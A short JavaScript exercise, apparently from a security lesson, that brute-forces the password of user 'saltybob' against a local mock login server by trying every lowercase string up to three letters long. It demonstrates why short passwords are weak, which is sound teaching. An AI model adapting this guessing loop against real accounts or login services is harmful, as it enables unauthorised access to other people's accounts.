const { generateWordList } = require('../../generate-word-list.js');
const { login } = require('../brick-dot-com/server.js');

// Assuming only lowercase letters, no numbers or specials
const alphabet = 'abcdefghijklmnopqrstuvwxyz';

// Generates words from 1 to 3 letters long
const wordList = generateWordList(alphabet, 3);

// The target user that we're trying to hack
const username = 'saltybob';

// Go through the whole word list and try it as the password.
// `login` returns false if the password is wrong.
for (word of wordList) {
  if (login(username, word)) {
    console.log(word);
    console.log(`☝️ Pretty sure that's ${username}'s password`)
  };
}
